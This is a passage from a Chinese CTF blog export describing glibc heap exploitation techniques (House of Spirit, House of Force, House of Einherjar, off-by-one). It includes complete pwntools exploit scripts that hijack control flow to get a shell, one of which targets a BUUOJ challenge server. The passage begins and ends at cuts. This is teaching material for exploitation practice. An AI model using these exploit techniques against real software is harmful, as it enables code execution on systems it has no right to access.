class="hljs-number">3</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    <br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xf81</span>)<br>edit(payload)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;aaaaaaaa&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5188</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>_IO_list_all = libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] + libc_base<br>sys = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xe0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br>vtable_addr = heap_base + <span class="hljs-number">0x5e8</span><br>stream = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="hljs-number">0x61</span>)<br>stream += p64(<span class="hljs-number">0</span>) + p64(_IO_list_all-<span class="hljs-number">0x10</span>)<br>stream += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>stream = stream.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&quot;\x00&quot;</span>)<br>stream += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># mode&lt;=0</span><br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(vtable_addr)<br>stream += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>stream += p64(sys)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>payload += stream<br>edit(payload)<br><span class="hljs-comment">#p.sendlineafter(&quot;: &quot;,&#x27;1&#x27;)</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>技术来源：<a href="https://www.anquanke.com/post/id/85357">https://www.anquanke.com/post/id/85357</a></p>
<p>House of Spirit（下面称为hos）算是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，关键在于能够覆盖一个堆指针变量，使其指向可控的区域，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域。</p>
<p>适用范围：到glibc-2.34依然可用</p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域</p>
<p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t01ab6f5c485fc67d66.png"><span class="image-caption">http://p7.qhimg.com/t01c4e1f8669a8b77bd.png</span></p>
<ul>
<li>（2）存在可将堆变量指针覆盖为指向可控区域，即上一步中的区域</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>（1）伪造堆块，在可控1及可控2（可控2的伪造size不能小于2*SIZE_SZ且不能大于已分配内存）构造好数据，将它伪造成一个fast chunk。</p>
<p>（2）覆盖堆指针指向上一步伪造的堆块。</p>
<p>（3）释放堆块，将伪造的堆块释放入fast bin里面。</p>
<p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。</p>
<p>第一步中的伪造堆块的过程，fastbin是一个单链表结构，遵循FIFO的规则，32位系统中fastbin的大小是在16<del>64字节之间，64位是在32</del>128字节之间。释放时会进行一些检查，所以需要对伪堆块中的数据进行构造，使其顺利的释放进到fastbin里面</p>
<p>注：fake_chunk的堆头标志位只能为0或者1（如0x70，0x71），其他两个标志位是会影响到堆块的释放的。</p>
<h3 id="例题BUU-lctf2016pwn200"><a href="#例题BUU-lctf2016pwn200" class="headerlink" title="例题BUU-lctf2016pwn200"></a>例题BUU-lctf2016pwn200</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204052044.png"><span class="image-caption">image-20210905204052044</span></p>
<p>常规checksec一下，保护基本没开。</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204120841.png"><span class="image-caption">image-20210905204120841</span></p>
<p>这里的输入存在漏洞，填满可以泄露出rsp上的值，获得栈上地址</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t014c47eb8e813cbe79.png"><span class="image-caption">http://p8.qhimg.com/t01eb7870c8fa4fde39.png</span></p>
<p>目标地址的构造为上图所示，在money中输入的是伪堆块的size，在id里输入的是下一个堆块的size，以此绕过free释放堆块时候系统的检查</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204549591.png"><span class="image-caption">image-20210905204549591</span></p>
<p>然后就是：</p>
<p>（1）覆盖堆指针，在输入money的时候，会覆盖堆块。</p>
<p>（2）调用free函数将伪堆块释放到fastbin中</p>
<p>（3）申请堆块，将刚刚的伪堆块申请出来</p>
<p>（4）输入数据，即可修改目标区域，eip，使其指向shellcode</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905230703667.png"><span class="image-caption">image-20210905230703667</span></p>
<p>这是构造出来的fake_chunk，后面就是要把这块释放了，然后再申请回来，把0x400b34这个地址覆盖为shellcode，即可在退出程序时返回到shellcode去执行</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905212358111.png"><span class="image-caption">image-20210905212358111</span></p>
<p>getshell！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26770)</span><br>p = process(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br><br>free_got = <span class="hljs-number">0x0000000000602018</span><br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#part one</span><br>payload  = <span class="hljs-string">&#x27;&#x27;</span><br>payload += shellcode.ljust(<span class="hljs-number">48</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>p.send(payload)<br>p.recvuntil(payload)<br><br>rbp_addr = u64(p.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br>shellcode_addr = rbp_addr - <span class="hljs-number">0x50</span> <span class="hljs-comment"># 20H + 30H</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shellcode_addr: &quot;</span>, <span class="hljs-built_in">hex</span>(shellcode_addr)<br>fake_addr = rbp_addr - <span class="hljs-number">0x90</span> <span class="hljs-comment"># offset 0x40 to shellcode, 0x400a29 return address</span><br><br><br>p.recvuntil(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;33&#x27;</span>) <span class="hljs-comment"># id</span><br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><br><span class="hljs-comment">#part two</span><br><span class="hljs-comment">#32bytes padding + prev_size + size + padding + fake_addr</span><br>data = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>)      <span class="hljs-comment"># no strcpy</span><br>data = data.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_addr)<br><span class="hljs-built_in">print</span> data<br>p.send(data)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)     <span class="hljs-comment"># free(fake_addr)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)     <span class="hljs-comment">#malloc(fake_addr) #fake_addr</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;long?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;48&#x27;</span>)<br>p.recvline(<span class="hljs-string">&#x27;48&#x27;</span>)  <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(shellcode_addr) <span class="hljs-comment"># write to target_addr</span><br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>来源：ctf.wiki</p>
<p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk指向我们期望的任何位置，这就相当于一次任意地址写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这是top chunk在分配堆块时会执行的操作的源码，会对用户请求的size和 top chunk 现有的 size 进行验证，并且将会更新top chunk位置，以及size</p>
<p>我们主要关心的是对于size的验证：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE) <span class="hljs-comment">//nb指我们申请的堆块大小</span><br></code></pre></td></tr></table></figure>

<p>所以，设想一下：如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证。一般的做法是把 top chunk 的 size 改为-1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说unsigned long 中最大的数，所以无论如何都可以通过验证。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.29</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<span class="hljs-comment">//0x21000</span><br>        malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>在glibc-2.29时增加了检查，size要小于等于system_mems，所以该方法在glibc-2.29以后失效了</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>综合上面的背景，我们可以得出，要想利用House of Force，要有以下条件：</p>
<ul>
<li><p>能够以溢出等方式控制到 top chunk 的 size 域</p>
<ul>
<li>为了能将size修改为-1(0xFFFFFFFFFFFFFFFF)</li>
</ul>
</li>
<li><p>能够自由地控制堆分配尺寸的大小</p>
<ul>
<li>为了能够将top chunk抬升到我们想写入的地址附近，一般为hook，而这之间的偏移非常大</li>
</ul>
</li>
</ul>
<h3 id="例题BUU-gyctf-2020-force"><a href="#例题BUU-gyctf-2020-force" class="headerlink" title="例题BUU-gyctf_2020_force"></a>例题BUU-gyctf_2020_force</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916151101226.png"><span class="image-caption">image-20210916151101226</span></p>
<p>常规checksec一下，64位保护全开</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153042695.png"><span class="image-caption">image-20210916153042695</span></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153101689.png"><span class="image-caption">image-20210916153101689</span></p>
<p>进入IDA，总共就两个功能：一个是申请堆块，堆块大小无限制，并且能返回给堆地址，然后填入内容是固定长度0x50；另外一个puts功能。。。屁用没有！因为存在固定长度的写入，那么只要申请一个小堆块就可以进行溢出修改top chunk的size位，所以House of Force的两个条件都达成了</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163309864.png"><span class="image-caption">image-20210916163309864</span></p>
<p>因为程序会返回堆的地址，程序又不限制堆块的大小，所以我们可以申请一个大于top chunk的堆块，那么程序就会调用mmap进行分配堆块，此时堆块的地址会是libc中的一个地址</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163532720.png"><span class="image-caption">image-20210916163532720</span></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205725583.png"><span class="image-caption">image-20210916205725583</span></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205619022.png"><span class="image-caption">image-20210916205619022</span></p>
<p>然后申请一个小于0x50的堆块，让堆块能进行溢出覆盖top chunk的size位，修改为-1（也就是0xFFFFFFFFFFFFFFFF），同时也借着这个堆块能获取到top chunk的地址。然后直接申请一个超大堆块，直接占满top chunk与__malloc_hook之间长度，然后再申请一个堆块去修改hook的为one_gadget即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>其实看完wiki，感觉就是 offbyone&amp;null 的利用方式，借着溢出修改下一个堆块的in_use位置，然后造成unlink制造出堆块重叠，所以就不过多介绍了，看我的 offbyone&amp;null 这篇博客是一样的，而且我还更新了新版本的利用，当然，是来自大佬的，我只是个搬运工👶</p>
<p>过程：</p>
<ul>
<li>需要有溢出漏洞可以修改物理相邻的高地址的 prev_size 与 INUSE 部分。</li>
<li>在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>offbyone&amp;null</title>
    <url>/2021/07/20/2021-07-26-offbyone&amp;null/</url>
    <content><![CDATA[<h1 id="offbyone"><a href="#offbyone" class="headerlink" title="offbyone"></a>offbyone</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>正常来说，我们希望程序的堆溢出能够溢出到next chunk的fd或者bk字段，进而完成利用。但是这样的情况是很少的，因而需要一种更加常见的特殊的堆溢出形式——offbyone，溢出字节就如他的名字一样，只能溢出一个字节。实际生活中这种漏洞很常见，程序员很容易犯这种错误，一般是因为边界检查不严格等情况。</p>
<p>怎么利用呢？试想一下，如果能溢出一个字节，那么我们申请个0xn8大小的堆块，那么多出的一个字节是不是可以修改下一个堆块的size字段？修改了之后，会让程序认为这个堆块的大小就是你修改的大小，从而导致overlap</p>
<p>如果你只把一个堆块的size变大，然后释放再申请出来，扩大的size将会从下面的堆块中取来，并把里面的内容清空，也就是想要再使用里面的堆块，需要去修复对应的堆头（用来泄露libc基址时，需要这样分开来操作）</p>
<p>offbyone情形：</p>
<ul>
<li>strlen函数把next chunk的size字段也给计入进去，造成溢出一个字节</li>
</ul>
<p>利用方式：堆中有ABCD四个已经被分配的大小为0x70的chunk，现在都是使用状态。然后A是我们进行offbyone的chunk，我们目的是将B的size改掉。</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164209854.png" style="zoom: 80%;"><span class="image-caption">image-20210726164209854</span>

<p>我们输入’A’*0x68 + ‘\xe1’,此时，堆块的布局如下：</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164413949.png" style="zoom:80%;"><span class="image-caption">image-20210726164413949</span>

<p>可以看到b的size被改大了，正好覆盖到了c的末尾，我们构造了chunkoverlap。这时候我们将C free掉，他会进入fastbin。我们再将B free掉，B+C这一段区域会进入unsorted bin。我们再次申请一个大小为0xd0的堆块，也就是说B+C这段内存被我们控制了，此时我们就可以控制C的fd字段，就可以进行fastbin attack了。</p>
<p>当然，实践应用的时候，并不局限说堆块大小都是0x70，0x28，0x38都行，只要能通过验证即可</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113130649.png"><span class="image-caption">image-20210726113130649</span></p>
<p>常规checksec一下，然后进入ida看看程序代码</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113232848.png"><span class="image-caption">image-20210726113232848</span></p>
<p>漏洞点存在与edit函数里面，在strlen函数里面，这个函数只有遇到’\x00’才会停止计数，如果我们申请0x78的堆块，并且填满0x78个字符，然后在这个堆块下面还存在一个堆块，那strlen就会把下一个堆块的size字段也给统计进去，从而可以多输入一个字符修改下一堆块的size字段。</p>
<p>那么该怎么构造呢？先申请四个0x68的堆块（至少四个）第一个用来修改下一个堆块的size字段，第四个用来防止与top chunk合并，中间两个用来制造overlap</p>
<p>把下一个堆块的size改为两倍大小——0xe1，接下来就是要让程序也认为被修改的堆块大小是0xe0，所以我们先后把第三块、第二块都释放掉，第三块进入fastbin，第二块由于size被改则进入到unsortedbin中，彻底让程序以为大小是为0xe0，最后只需要把0xe0的堆块申请出来，就可以修改其中本来是第三块的fd指针</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164722535.png"><span class="image-caption">image-20210726164722535</span></p>
<p>成功制造了overlap，两个0x70的堆块合并了</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164617715.png"><span class="image-caption">image-20210726164617715</span></p>
<p>很明显看到，fd指针已经被我们修改为我们想要分配chunk的地方</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164850626.png"><span class="image-caption">image-20210726164850626</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbyone&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>	p.send(content)	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>+p8(<span class="hljs-number">0xe1</span>))<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span 